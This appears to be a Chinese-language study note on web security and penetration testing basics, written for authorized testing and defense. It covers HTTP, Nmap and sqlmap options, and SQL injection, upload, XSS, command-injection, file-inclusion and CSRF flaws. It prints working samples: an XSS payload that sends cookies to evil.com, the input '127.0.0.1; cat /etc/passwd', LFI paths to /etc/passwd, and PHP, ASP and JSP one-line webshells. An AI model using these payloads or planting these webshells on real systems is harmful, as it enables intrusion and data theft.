---
date: 2026-05-31 14:40:15
title: Web安全要点
permalink: web-sec-intro
publish: true
tags:
  - 杂项学习
  - Web
---

# Web安全要点

>- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
>- [MDN：HTTP 概述](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview)

!!! warning "学习声明"
    本文内容仅供**授权渗透测试、安全研究与防御**学习使用。未经授权对他人系统进行扫描、入侵或破坏属于违法行为。

## 1. 黑客、白客、灰客

| 称呼 | 英文 | 含义 |
|------|------|------|
| **黑客** | Hacker | 泛指精通计算机技术、能发现并利用系统弱点的人；大众语境常带“攻击者”色彩，与安全行业里的“黑客文化”（追求技术深度）不完全相同 |
| **白客** | White Hat | **白帽**：在**授权**前提下做渗透测试、漏洞挖掘与修复，遵守法律与职业道德 |
| **灰客** | Gray Hat | **灰帽**：行为介于两者之间，例如未获授权就披露漏洞、或“先攻再通知”，动机与合法性往往模糊 |

!!! tip
    职业上更常用 **Red Team（红队，模拟攻击）** 与 **Blue Team（蓝队，防御检测）** 来区分攻防角色，而不是单纯用“黑/白/灰”标签。

---

## 2. Web 入侵途径与 C 段渗透

### 常见 Web 入侵途径

1. **信息收集**：域名、子域、目录、技术栈、员工邮箱等  

2. **漏洞利用**：SQL 注入、XSS、文件上传、命令执行、文件包含、CSRF 等  

3. **弱口令 / 暴力破解**：后台、SSH、数据库、中间件管理口  

4. **供应链与配置错误**：默认口令、调试接口未关、备份文件泄露（`.git`、`web.zip`）  

5. **社会工程学**：钓鱼、凭据窃取  

6. **内网横向**：拿下 Web 服务器后，继续攻击同网段其他主机  

### 什么是 C 段渗透

**C 段**指 IP 地址中第三段相同的一组地址。例如目标为 `203.0.113.50`，则 `203.0.113.0/24`（`203.0.113.1`～`203.0.113.254`）常被称为该目标的 **C 段**。

**C 段渗透**：在攻破一台主机或确认其所在网段后，对**同一 C 段**内其他 IP 进行扫描与渗透，寻找：

- 同公司其他业务系统  

- 管理后台、数据库、运维跳板机  

- 配置薄弱或共用凭据的服务器  

!!! note
    C 段渗透依赖**内网可达性**或**公网同段多业务暴露**；云环境下多租户隔离后，传统“扫邻居 C 段”效果可能不如从前，但**资产关联发现**（同一备案、同一证书、同一 ASN）思路仍然重要。

---

## 3. 什么是 Web？安全三要素

### 什么是 Web

**Web**（万维网）是基于 **HTTP/HTTPS** 等协议，通过浏览器访问**超文本**及各类资源（HTML、CSS、JS、API、文件）的应用形态。典型架构：

```text
浏览器 ←→ Web 服务器（Nginx/Apache/IIS）←→ 应用（PHP/Java/Node）←→ 数据库/缓存/文件系统
```

### 信息安全三要素（CIA）

| 要素 | 英文 | 含义 | Web 中的例子 |
|------|------|------|----------------|
| **机密性** | Confidentiality | 数据不被未授权者获取 | HTTPS、访问控制、防 SQL 注入拖库 |
| **完整性** | Integrity | 数据不被未授权篡改 | 防 CSRF 改资料、防中间人篡改、参数签名校验 |
| **可用性** | Availability | 服务可被授权用户正常使用 | 防 DDoS、防勒索、资源耗尽攻击 |

!!! important
    实际工作中还会补充 **不可否认性**、**可审计性** 等，但入门与 Web 渗透大纲一般以 **CIA** 为核心框架。

---

## 4. HTTP 协议详解

### HTTP 特点

- **基于请求-响应**：客户端发请求，服务器回响应  

- **无状态（Stateless）**：协议本身不记录上一次请求；状态靠 Cookie / Session / Token 维持  

- **明文传输（HTTP）**：易被窃听与篡改；生产环境应使用 **HTTPS**（HTTP + TLS）  

- **灵活可扩展**：通过 Header 传递 Cookie、认证、缓存、内容类型等  

### URL 结构

```text
https://user:pass@example.com:443/path/page?name=value#section
  │      │    │      │         │   │            │         └── 片段（#锚点，不发往服务器）
  │      │    │      │         │   │            └── 查询字符串 ?key=value
  │      │    │      │         │   └── 路径
  │      │    │      │         └── 端口（HTTPS 默认 443，HTTP 默认 80）
  │      │    │      └── 主机名
  │      │    └── 密码（少见，且不安全）
  │      └── 用户名（少见）
  └── 协议
```

### HTTP 请求（Request）

```http
GET /search?q=test HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: text/html
Cookie: sessionid=abc123
Connection: close

（GET 通常无 Body；POST 等方法可有 Body）
```

| 部分 | 说明 |
|------|------|
| **请求行** | 方法 + 路径 + 协议版本，如 `GET /index HTTP/1.1` |
| **请求头** | `Host`（虚拟主机必备）、`Cookie`、`Content-Type`、`Authorization` 等 |
| **请求体** | POST/PUT 等携带的表单、JSON、文件上传数据 |

**常见方法**：`GET`（取资源）、`POST`（提交数据）、`PUT`/`DELETE`（REST）、`HEAD`（只要头）、`OPTIONS`（CORS 预检）

### HTTP 响应（Response）

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: sessionid=xyz; HttpOnly
Content-Length: 1234

<html>...</html>
```

| 部分 | 说明 |
|------|------|
| **状态行** | 协议 + **状态码** + 原因短语 |
| **响应头** | `Content-Type`、`Set-Cookie`、`Location`（重定向）等 |
| **响应体** | HTML、JSON、文件二进制等 |

**常见状态码**：`200` 成功、`301/302` 重定向、`400` 错误请求、`401` 未认证、`403` 禁止、`404` 未找到、`500` 服务器内部错误  

---

## 5. Google Hacking

### 定义

**Google Hacking**（搜索引擎渗透 / Google Dorking）指利用搜索引擎的高级语法，从公开索引中挖掘**敏感信息**（后台入口、配置文件、报错信息、未授权文档等）。Bing、百度等也支持类似 `site:`、`inurl:` 思路。

### 常用语法

| 语法 | 含义 | 示例 |
|------|------|------|
| `site:` | 限定站点或域名 | `site:edu.cn inurl:login` |
| `inurl:` | URL 中含关键词 | `inurl:admin` |
| `intitle:` | 标题中含关键词 | `intitle:"后台管理"` |
| `intext:` | 正文含关键词 | `intext:"sql syntax"` |
| `filetype:` | 指定文件类型 | `filetype:sql 密码` |
| `ext:` | 同 filetype，扩展名 | `ext:env DB_PASSWORD` |
| `-` | 排除关键词 | `site:xx.com -www` |
| `"..."` | 精确匹配短语 | `"index of /" ftp` |
| `OR` / `\|` | 逻辑或 | `inurl:login OR inurl:admin` |
| `cache:` | 查看缓存快照 | `cache:example.com` |

!!! warning
    仅对你**有权测试**的资产使用上述技术；对陌生站点批量 Dork 可能触犯法律法规与对方服务条款。

---

## 6. Nmap 常用参数

**Nmap** 用于主机发现、端口扫描、服务与版本探测、脚本检测（NSE）。

| 参数 | 含义 |
|------|------|
| `-sS` | TCP SYN 半开扫描（需 root，较快较隐蔽） |
| `-sT` | TCP 全连接扫描（不需 root，较慢） |
| `-sU` | UDP 扫描 |
| `-sV` | 版本探测 |
| `-sC` | 默认脚本扫描（等同 `--script=default`） |
| `-O` | 操作系统探测 |
| `-p 80,443` | 指定端口 |
| `-p-` | 全端口 1–65535 |
| `-Pn` | 跳过主机发现（当禁 ping 时） |
| `-T0`～`-T5` | 时序模板，越高越快越易被检测 |
| `-A` | 激进模式：OS、版本、脚本、路由追踪 |
| `-oN file` | 正常格式输出到文件 |
| `--script=vuln` | 运行漏洞相关 NSE 脚本 |

```bash
# 示例：扫描目标 80/443 并做版本与默认脚本
nmap -sS -sV -sC -p 80,443,8080 192.0.2.10
```

---

## 7. 常用漏洞检测工具

| 类型 | 工具 | 用途简述 |
|------|------|----------|
| 综合扫描 | **Nessus**、**OpenVAS**、**AWVS**、**AppScan** | 主机/Web 漏洞扫描与报告 |
| Web 专项 | **Burp Suite**、**OWASP ZAP** | 抓包改包、爬虫、被动/主动扫描 |
| SQL 注入 | **sqlmap** | 自动化检测与利用 SQL 注入 |
| 目录与指纹 | **dirsearch**、**gobuster**、**whatweb** | 目录爆破、CMS/中间件识别 |
| 子域 | **subfinder**、**amass** | 子域名收集 |
| 弱口令 | **hydra**、**medusa** | 多协议暴力破解 |
| 专项 | **XSStrike**、**Commix** | XSS、命令注入辅助 |

!!! tip
    工具只能辅助；**手工验证**与理解业务逻辑，才能减少误报并发现自动化扫描器遗漏的逻辑漏洞。

---

## 8. SQL 注入

### 原理

应用程序把用户输入**拼进 SQL 字符串**执行，攻击者通过构造输入**改变 SQL 语义**，从而越权查询、读写数据甚至执行系统命令（视数据库与权限而定）。

```sql
-- 正常意图：查用户 admin
SELECT * FROM users WHERE name = 'admin';

-- 若拼接 id：name = ' OR '1'='1
SELECT * FROM users WHERE name = '' OR '1'='1';  -- 条件恒真，可能返回全部用户
```

### 常见类型

| 类型 | 说明 |
|------|------|
| **联合查询注入** | 用 `UNION SELECT` 把额外查询结果拼到页面 |
| **报错注入** | 利用数据库报错回显数据 |
| **布尔盲注** | 页面真假变化，无直接数据回显 |
| **时间盲注** | 用 `SLEEP()` 等等待时间差判断 |
| **堆叠注入** | 多语句执行（`;` 后追加语句，视驱动是否允许） |
| **宽字节 / 编码绕过** | 利用字符集转换等方式绕过转义 |

### sqlmap 常用参数

| 参数 | 含义 |
|------|------|
| `-u URL` | 目标 URL |
| `--data="a=1&b=2"` | POST 数据 |
| `-p id` | 指定测试参数 |
| `--cookie="..."` | 携带 Cookie |
| `--dbs` | 列数据库名 |
| `-D dbname --tables` | 列某库表名 |
| `-D db -T tbl --dump` | 导出表数据 |
| `--level=1-5` | 测试深度 |
| `--risk=1-3` | 风险等级（高 risk 可能删改数据） |
| `--batch` | 非交互，默认选是 |
| `--tamper=space2comment` | 使用绕过脚本 |
| `--os-shell` | 尝试获取系统 shell（需满足条件） |

### SQL 注入点判断（手工思路）

1. **单引号探测**：`'` → 是否 SQL 报错、页面异常  

2. **布尔**：`and 1=1` / `and 1=2` 页面是否不同  

3. **时间**：`and sleep(5)--` 是否明显延迟  

4. **联合**：`order by n` 猜列数，再 `union select 1,2,3...`  

5. **User-Agent / Referer / Cookie** 头中的注入点  

---

## 9. 上传漏洞

### 什么是上传漏洞

Web 允许用户上传文件时，若**未严格校验**文件类型、内容、路径与执行权限，攻击者可上传 **Webshell**、恶意脚本或覆盖关键文件，进而**远程控制**服务器。

### IIS 解析漏洞（历史）

早期 **IIS 6.0** 对扩展名解析顺序存在缺陷，例如：

- `shell.asp;.jpg` → 可能按 **ASP** 执行  

- 目录解析：`/test.asp/1.jpg` → 在 `test.asp` 目录下 `.jpg` 也可能被当作 ASP 执行  

**字符截断**：部分环境对文件名长度有限制，超长文件名被截断后保留危险后缀，如 `shell.asp` + 大量空格 + `.jpg` 被截成 `shell.asp`。

!!! note
    现代 IIS 版本已修复多数经典解析问题；学习时用于理解**“服务器如何决定由谁执行这个文件”**，防御重点是**禁止上传目录执行脚本** + **白名单** + **随机文件名**。

### 绕过服务端检测的常用方法

| 手段 | 说明 |
|------|------|
| 改 MIME / 双扩展名 | `shell.php.jpg`、`Content-Type: image/jpeg` |
| 文件头伪造 | 在木马前加 `GIF89a` 等魔术字节 |
| 大小写 / 空格 / 点 | `.pHp`、`.php.`（Windows）、`%00` 截断（老环境） |
| 解析差异 | Apache `php5`、Nginx `cgi.fix_pathinfo` 等配置不当 |
| `.htaccess` | 上传并改写解析规则（需允许上传且可执行） |

### 白名单 vs 黑名单

| 方式 | 做法 | 优缺点 |
|------|------|--------|
| **黑名单** | 禁止 `.php`、`.asp` 等 | 易被大小写、双后缀、冷门扩展名绕过 |
| **白名单** | 仅允许 `.jpg`、`.png`、`.pdf` 等 | 更安全；需配合**内容检测**、**重命名**、**独立存储域** |

**推荐**：白名单 + 服务端重新编码图片 + 上传目录**无执行权限** + 对象存储分离。

---

## 10. XSS 跨站脚本

### 定义与原理

**XSS（Cross-Site Scripting）**：攻击者把**恶意脚本**注入页面，当其他用户浏览时，脚本在其浏览器中执行，可窃取 Cookie、篡改页面、钓鱼等。

原理：站点把**不可信输入**当作 HTML/JS **原样输出**到页面，未做编码或过滤。

```html
<!-- 若搜索关键词未编码直接回显 -->
<p>您搜索的是： <script>document.location='http://evil.com?c='+document.cookie</script></p>
```

### 三种类型

| 类型 | 英文 | 特点 |
|------|------|------|
| **反射型** | Reflected | 恶意脚本在 URL 参数中，**一次请求一次响应**，常需诱骗用户点击链接 |
| **存储型** | Stored | 脚本**存进数据库/留言板**，所有访问该页面的用户都会中招，危害大 |
| **DOM 型** | DOM-based | 不经过服务端拼接 SQL 式存储，由**前端 JS** 读写 `location`、`innerHTML` 等导致 |

**防御要点**：输出编码（HTML/JS/URL 上下文区分）、CSP、`HttpOnly` Cookie、输入校验。

---

## 11. 命令执行漏洞

### 产生原因

后端把用户输入**拼进操作系统命令**并调用 `system()`、`exec()`、`shell_exec()`、`` `cmd` `` 等执行，例如：

```php
// 危险示例
system("ping -c 4 " . $_GET['ip']);
```

攻击者输入 `127.0.0.1; cat /etc/passwd` 或 `| whoami`，在服务器上执行任意命令。

**常见场景**：Ping、Traceroute、图片处理（ImageMagick）、备份脚本、DevOps 接口。

**防御**：避免调用 shell；使用参数化库；严格白名单校验 IP/主机名；最小权限运行 Web 进程。

---

## 12. ping 命令使用

| 系统 | 基本用法 | 说明 |
|------|----------|------|
| **Linux** | `ping -c 4 8.8.8.8` | `-c` 次数，`-i` 间隔，`-W` 超时 |
| **Windows** | `ping -n 4 8.8.8.8` | `-n` 次数，`-t` 持续直到 Ctrl+C |

```bash
ping -c 4 example.com    # 测连通与 RTT
ping6 2001:4860:4860::8888  # IPv6
```

在渗透练习中，Ping 功能常是**命令执行漏洞**的入口；测试时用 `127.0.0.1` 与管道符 `; | &&` 等需谨慎且在授权范围内进行。

---

## 13. 常用一句话木马

一句话木马：极短服务端脚本，接收**密码参数**后执行攻击者传入的代码（如 `eval`）。

### PHP（示例格式，仅作识别与防御）

```php
<?php @eval($_POST['pass']); ?>
```

| 部分 | 含义 |
|------|------|
| `@` | 抑制报错 |
| `eval()` | 把字符串当 PHP 代码执行 |
| `$_POST['pass']` | 从 POST 参数 `pass` 取命令体 |

### ASP / ASP.NET

```asp
<% eval request("pass") %>
```

```csharp
<%@ Page Language="Jscript"%><%eval(Request.Item["pass"]);%>
```

### JSP

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

!!! danger
    上线后应通过**文件完整性监控**、**WAF**、**禁止 Web 目录写权限** 与 **后门查杀** 进行检测；切勿在未授权系统上传或使用。

---

## 14. 文件包含漏洞

**文件包含（File Inclusion）**：应用通过 `include`/`require` 等把用户可控路径的文件载入执行或显示。

| 类型 | 说明 |
|------|------|
| **本地文件包含 LFI** | 读取服务器本地文件，如 `?file=../../../etc/passwd` |
| **远程文件包含 RFI** | 载入远程 URL 的恶意脚本（需 `allow_url_include` 等开启，现已少见） |

**典型代码**：

```php
include($_GET['page'] . '.php');  // ?page=../../../etc/passwd%00 老环境截断
```

**利用**：读敏感配置、配合上传的**图片马 + 包含** getshell、日志包含（写入 UA 到 access.log 再包含）。

**防御**：白名单映射页面名、禁止路径遍历字符、关闭不必要的 URL 包含、固定基础目录。

---

## 15. CSRF 与 XSS 的异同

### CSRF 是什么

**CSRF（Cross-Site Request Forgery，跨站请求伪造）**：攻击者诱导**已登录用户**的浏览器，**自动向目标站**发送恶意请求（改密码、转账、发文章），浏览器会**自动带上 Cookie**，服务器误以为是用户本人操作。

### 与 XSS 对比

| 维度 | XSS | CSRF |
|------|-----|------|
| **攻击核心** | 在受害站点**执行恶意脚本** | **借用用户身份**发请求，不一定要执行 JS |
| **是否需要脚本** | 通常需要注入脚本 | 可用 `<img src>`、表单自动提交等 |
| **窃取 Cookie** | 可直接读（若无 HttpOnly） | 一般读不到 HttpOnly Cookie，但可利用 Cookie **带身份操作** |
| **防御** | 输出编码、CSP | CSRF Token、SameSite Cookie、验证 Referer/Origin |

!!! tip
    **XSS 是“在你家页面上跑代码”**；**CSRF 是“冒充你点击按钮”**。二者可组合：XSS 盗取 Token 后进一步绕过 CSRF 防护。

---

## 16. 暴力破解与 Burp Suite

### 什么是暴力破解

对**口令、验证码、会话 ID** 等穷举或字典尝试，直到猜中。常见于后台登录、SSH、数据库、API Key。

**缓解**：强口令策略、多因素认证、验证码、账户锁定、限速与告警。

### Burp Intruder 暴力破解流程

1. **Proxy** 抓登录包，发送到 **Intruder**  

2. **Positions**：清除无关标记，仅对 `username`、`password` 等参数设 **§payload§**  

3. **Payloads**：加载字典（用户名字典 + 密码字典，可 **Cluster bomb** 组合）  

4. **Attack type**：**Sniper**（单参数多值）、**Battering ram**（同 payload 打所有位置）、**Pitchfork**（多列表对齐）、**Cluster bomb**（笛卡尔积）  

5. **Options**：设置线程 **Throttle**、**Grep - Match** 匹配“登录成功”关键字或长度差异  

6. 开始攻击，根据 **响应长度 / 状态码 / 关键词** 筛选成功项  

!!! warning
    仅对自有或书面授权目标进行；高频请求可能触发封禁或违法。

---

## 17. 完整渗透流程与方案示例

### 标准阶段（PTES / 常见方法论）

```text
1. 前期交互    → 明确目标、范围、规则、免责与联系方式
2. 信息收集    → 子域、端口、服务、人员、历史漏洞
3. 威胁建模    → 梳理攻击面与优先级
4. 漏洞分析    → 扫描 + 手工验证
5. 渗透攻击    → 利用、提权、横向移动
6. 后渗透      → 维持访问、数据取证（在授权范围内）
7. 报告        → 风险评级、复现步骤、修复建议
```

### 针对目标的渗透方案示例

**场景**：某公司授权测试 `www.example.com`（仅 Web，禁止 DoS 与社工）

| 阶段 | 动作 |
|------|------|
| **信息收集** | `whois`、子域枚举、Nmap 扫 `80/443/8080`、`whatweb` 指纹识别 CMS |
| **目录与入口** | dirsearch、Google `site:example.com inurl:admin`、检查 `.git` 泄露 |
| **漏洞检测** | Burp 爬虫 + 手工测登录、上传、搜索框 SQLi、反射 XSS |
| **漏洞利用** | 若存在 SQLi → sqlmap 拖库（授权范围内）；上传 getshell → **仅 proof（如 calc.txt）** |
| **权限与横向** | 若在内网范围 → 读配置拿数据库密码、C 段扫描（需授权书写明） |
| **清理与报告** | 删除测试文件、账号、Webshell；提交 CVE 级修复建议与复现截图 |

**交付物**：资产清单、漏洞列表（高危优先）、复现步骤、修复优先级、复测计划。

---
